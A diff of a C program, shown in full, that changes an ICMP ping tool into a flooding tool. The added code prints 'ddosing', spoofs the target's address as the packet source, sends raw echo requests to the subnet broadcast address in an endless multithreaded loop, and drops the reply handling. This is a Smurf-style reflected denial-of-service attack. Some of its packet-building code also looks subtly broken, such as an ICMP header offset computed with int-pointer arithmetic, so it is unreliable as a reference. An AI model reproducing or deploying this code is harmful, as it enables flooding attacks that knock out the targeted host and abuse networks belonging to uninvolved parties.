@@ -29,7 +29,7 @@ void tv_sub(struct timeval *out, const struct timeval *in)
     return;
 }
 
-int display(void* buf, int bytes, uint16_t thread_id)
+int display(void* buf)
 {
     struct iphdr *ip = (struct iphdr*)buf;
     struct icmphdr *icmp = (struct icmphdr*)((int*)buf + ip->ihl);
@@ -66,7 +66,7 @@ int display(void* buf, int bytes, uint16_t thread_id)
     return 1;
 }
 
-void listener(uint16_t thread_id)
+void listener()
 {
     int sd;
     struct sockaddr_in addr;
@@ -94,7 +94,7 @@ void listener(uint16_t thread_id)
         if (finish.tv_sec > 1)
             return;
         if (bytes > 0) {
-            int res = display(buf, bytes, thread_id);
+            int res = display(buf);
             if (!res) {
                 sleep(1);
                 exit(0);
@@ -107,35 +107,71 @@ void listener(uint16_t thread_id)
 
 void* ping(void* arg)
 {
+    puts("ddosing");
     struct thread_info *tinfo = (struct thread_info*)arg;
     struct sockaddr_in* addr = &(tinfo->addr);
-    int sd, cnt = 1;
+    int sd;
     struct packet pckt;
+
+    char netmask[] = "255.255.255.0";
+    struct in_addr mask, broadcast;
+    struct sockaddr_in broadcast_addr;
+    if (inet_pton(AF_INET, netmask, &mask) == 1)
+        broadcast.s_addr = addr->sin_addr.s_addr | ~mask.s_addr;
+    else {
+        fprintf(stderr, "Failed converting strings to numbers\n");
+        return NULL;
+    }
+
+    broadcast_addr.sin_family = addr->sin_family;
+    broadcast_addr.sin_port = addr->sin_port;
+    broadcast_addr.sin_addr.s_addr = broadcast.s_addr;
 
     sd = socket(PF_INET, SOCK_RAW, proto->p_proto);
     if (sd < 0) {
-        perror("socket");
-        return NULL;
+    perror("socket");
+    return NULL;
     }
     if ( fcntl(sd, F_SETFL, O_NONBLOCK) != 0)
-        perror("Request Nonblocking I/O");
+    perror("Request Nonblocking I/O");
 
-    int val = 0;
+    int bcast = 1;
+
+    if (setsockopt(sd, SOL_SOCKET, SO_BROADCAST, (char *) &bcast, sizeof(bcast)))
+        perror("Set Broadcast option");
+
+    int val = 255;
+    if (setsockopt(sd, SOL_IP, IP_TTL, &val, sizeof(val)) != 0)
+        perror("Set TTL option");
+
+    int hincl = 1;
+    setsockopt(sd, IPPROTO_IP, IP_HDRINCL, &hincl, sizeof(hincl));
+
+    struct iphdr *ip = (struct iphdr*)&pckt;
+    struct icmphdr *icmp = (struct icmphdr*)((int*)&pckt + sizeof(struct iphdr));
+
+    ip->tot_len = sizeof(struct iphdr) + sizeof(struct icmphdr) + MSG_SIZE;
+    ip->ihl = sizeof *ip >> 2;
+    ip->version = 4;
+    ip->ttl = 255;
+    ip->tos = 0;
+    ip->frag_off = 0;
+    ip->id = htons(getpid());
+    ip->protocol = 1;
+    ip->saddr = addr->sin_addr.s_addr;
+    ip->daddr = broadcast.s_addr;
+    /*ip->sum = 0;*/
+
+    icmp->type = 8;
+    icmp->code = 0;
+    /*icmp->icmp_cksum = htons(~(ICMP_ECHO << 8));*/
+    icmp->checksum = checksum(icmp, sizeof(struct icmphdr) + MSG_SIZE);
+
     for (;;) {
-        val++;
         printf("\n");
-        printf("----------\n");
-        printf("TTL: %d\n", val);
-        if (setsockopt(sd, SOL_IP, IP_TTL, &val, sizeof(val)) != 0)
-            perror("Set TTL option");
-        memset(&pckt, 0, sizeof(pckt));
-        pckt.hdr.type = ICMP_ECHO;
-        pckt.hdr.un.echo.id = tinfo->thread_id;
-        pckt.hdr.un.echo.sequence = cnt++;
-        pckt.hdr.checksum = checksum(&pckt, sizeof(pckt));
-        if (sendto(sd, &pckt, sizeof(pckt), 0, (struct sockaddr*)addr, sizeof(*addr)) <= 0)
+        printf("%s\n", msg);
+        if (sendto(sd, &pckt, sizeof(pckt), 0, (struct sockaddr*)&broadcast_addr, sizeof(broadcast_addr)) <= 0)
             perror("sendto");
-        listener(tinfo->thread_id);
     }
     return NULL;
 }
@@ -166,9 +202,9 @@ int main(int argc, char *argv[])
         pthread_create(&tinfo[i].thread_id, NULL, &ping, &tinfo[i]);
 
         /*if ((pid = fork()) == 0)*/
-            /*ping(&addr);*/
+        /*ping(&addr);*/
         /*else*/
-            /*listener();*/
+        /*listener();*/
     }
     while(1);
     pthread_mutex_destroy(&lock);
